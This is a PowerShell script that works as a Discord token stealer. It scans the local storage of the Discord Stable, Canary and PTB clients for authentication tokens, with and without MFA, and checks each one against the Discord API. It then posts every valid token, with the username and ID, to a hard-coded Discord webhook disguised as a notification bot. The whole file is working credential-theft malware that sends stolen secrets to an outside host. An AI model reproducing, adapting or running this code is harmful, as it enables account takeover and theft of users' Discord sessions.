# http://f1sk.xyz // http://jayy.xyz
# <3
$id=""
$tmpID=""
$user=""
$tmpTag=""
$possibleTokens = @()
$discordPath = $env:APPDATA+"\discord"
$storagePath = "\Local Storage\leveldb"
$stable = $discordPath+$storagePath
$canary = $discordPath+"canary"+$storagePath
$ptb = $discordPath+"ptb"+$storagePath
if ( Test-Path -LiteralPath $stable ) {
    Set-Location $stable
    $files = @(Get-ChildItem *.ldb)
    Foreach ($file in $files)
    {
                $mfa = Select-String -Path $file -Pattern "mfa\.[a-zA-Z0-9_-]{84}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
        if ($mfa.length -gt 1) {
            try {
                $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $mfa} -UseBasicParsing -EV Err -EA SilentlyContinue
            } catch {
                # $_.Exception.Response.StatusCode.Value__
            }
            }
            if ($r.statusCode -eq "200") 
            {
                $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                $id = $tmpID.id
                $possibleTokens += @([pscustomobject]@{Type="MFA";Location="DiscordStable";Token=$mfa;User=$user;ID=$id})
            } else {
            }
            $id=""
            $tmpID=""
            $user=""
            $r=""
            $tkn = Select-String -Path $file -Pattern "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
            if ($tkn.length -gt 2) {
                try {
                    $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                    -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $tkn} -UseBasicParsing -EV Err -EA SilentlyContinue
                } catch {
                     # $_.Exception.Response.StatusCode.Value__
            }
                }
                if ($r.statusCode -eq "200")
                {
                    $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                    $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                    $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                    $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                    $id = $tmpID.id
                    $possibleTokens += @([pscustomobject]@{Type="NO MFA";Location="DiscordStable";Token=$tkn;User=$user;ID=$id})
                    $r=""
                    $id=""
                    $tmpID=""
                    $user=""
                } else {
                    $r=""
                    $id=""
                    $tmpID=""
                    $user=""
                }
}
}
if ( Test-Path -LiteralPath $canary ) {
    Set-Location $canary
    $files = @(Get-ChildItem *.ldb)
    Foreach ($file in $files)
    {
        $mfa = Select-String -Path $file -Pattern "mfa\.[a-zA-Z0-9_-]{84}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
        if ($mfa.length -gt 1) {
            try {
                $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $mfa} -UseBasicParsing -EV Err -EA SilentlyContinue
            } catch {
                 # $_.Exception.Response.StatusCode.Value__
            }
            }
            if ($r.statusCode -eq "200")
            {
                $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                $id = $tmpID.id
                $possibleTokens += @([pscustomobject]@{Type="MFA";Location="DiscordCanary";Token=$mfa;User=$user;ID=$id})
                $r=""
                $id=""
                $tmpID=""
                $user=""
            } else {
                $r=""
                $id=""
                $tmpID=""
                $user=""
            }
            $tkn = Select-String -Path $file -Pattern "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
            if ($tkn.length -gt 2) {
                try {
                    $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                    -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $tkn} -UseBasicParsing -EV Err -EA SilentlyContinue
                } catch {
                     # $_.Exception.Response.StatusCode.Value__
            }
                }
                if ($r.statusCode -eq "200")
                {
                    $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                    $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                    $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                    $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                    $id = $tmpID.id
                    $possibleTokens += @([pscustomobject]@{Type="NO MFA";Location="DiscordCanary";Token=$tkn;User=$user;ID=$id})
                    $id=""
                    $r=""
                    $tmpID=""
                    $user=""
                } else {
                    $id = ""
                }
}
}
if ( Test-Path -LiteralPath $ptb ) {
    Set-Location $ptb
    $files = @(Get-ChildItem *.ldb)
    Foreach ($file in $files)
    {
        $mfa = Select-String -Path $file -Pattern "mfa\.[a-zA-Z0-9_-]{84}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
        if ($mfa.length -gt 1) {
            try {
                $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $mfa} -UseBasicParsing -EV Err -EA SilentlyContinue
            } catch {
                 # $_.Exception.Response.StatusCode.Value__
            }
            }
            if ($r.statusCode -eq "200")
            {
                $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                $id = $tmpID.id
                $possibleTokens += @([pscustomobject]@{Type="MFA";Location="DiscordCanary";Token=$mfa;User=$user;ID=$id})
                $r=""
                $id=""
                $tmpID=""
                $user=""
            } else {
                $r=""
                $id=""
                $tmpID=""
                $user=""
            }
            $tkn = Select-String -Path $file -Pattern "[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}" -AllMatches | ForEach-Object { $_.Matches } | ForEach-Object { $_.Value }
            if ($tkn.length -gt 2) {
                try {
                    $r = Invoke-WebRequest https://discordapp.com/api/v6/users/@me `
                    -Headers @{"Accept" = "application/json";"User-Agent" = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.308 Chrome/78.0.3904.130 Electron/7.3.2 Safari/537.36"; "Authorization" = $tkn} -UseBasicParsing -EV Err -EA SilentlyContinue 
                } catch {
                     # $_.Exception.Response.StatusCode.Value__
            }
                }
                if ($r.statusCode -eq "200")
                {
                    $tmpID = $r.content | ConvertFrom-Json | Select-Object id
                    $tmpUsername = $r.content | ConvertFrom-Json | Select-Object username
                    $tmpTag = $r.content | ConvertFrom-Json | Select-Object discriminator
                    $user = $tmpUsername.username+"#"+$tmpTag.discriminator
                    $id = $tmpID.id
                    $possibleTokens += @([pscustomobject]@{Type="NO MFA";Location="DiscordCanary";Token=$tkn;User=$user;ID=$id})
                    $id=""
                    $r=""
                    $tmpID=""
                    $user=""
                } else {
                    $id = ""
                }
}
}
$id=""
$tmpID=""
$user=""
$tmpTag=""
Write-Output $possibleTokens




# عنوان الويب هوك الخاص بك
$webhook_url = "https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7"

# إعداد الـ Embed
$embed = @{
    title = "🚀 PowerShell Notification"
    description = "A message has been sent with a [clickable link](https://discord.com)!"
    color = 5814783  # كود اللون بالأحمر الداكن مثلاً
    fields = @(
        @{
            name = "📦 Tokens Found"
            value = "```$possibleTokens```"
            inline = $false
        },
        @{
            name = "📎 Link Example"
            value = "[Open Discord](https://discord.com)"
            inline = $true
        }
    )
    footer = @{
        text = "Sent via PowerShell • " + (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    }
    thumbnail = @{
        url = "https://i.imgur.com/Z4mB6rL.png"
    }
}

# إعداد الـ Payload النهائي
$payload = @{
    username = "🔔 Notification Bot"
    avatar_url = "https://i.imgur.com/Z4mB6rL.png"
    embeds = @($embed)
} | ConvertTo-Json -Depth 5

# إرسال الطلب
Invoke-RestMethod -Uri $webhook_url -Method Post -Body $payload -ContentType 'application/json'

